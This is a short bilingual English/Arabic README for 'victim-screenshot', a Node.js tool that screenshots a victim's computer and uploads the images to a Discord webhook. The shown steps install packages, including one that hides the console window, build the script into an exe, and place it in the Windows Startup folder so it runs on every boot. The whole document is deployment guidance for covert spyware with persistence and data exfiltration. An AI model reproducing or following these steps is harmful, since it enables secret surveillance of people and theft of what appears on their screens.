# victim-screenshot
screenshot from victim pc and  screenshot upload in webhook discord /  webhook discord لقطة شاشة من جهاز كمبيوتر الضحية وتحميل لقطة الشاشة في 


## install packge / تحميل الحزم
```sh
npm init -y
npm install request
npm install --save screenshot-desktop
npm install node-hide-console-window
npm install -g pkg
```
## Convert to exe / exe تحويل إلى 
```sh
pkg index.js
```

## the victim / الضحية
> Note: put file exe (after conversion) in `C:\Users\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` because this autostart Folder.


> ملحوظة:ضع ملف exe (بعد الحويل) في `C:\Users\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` لأن هذا المجلد لتشغيل تلقائي
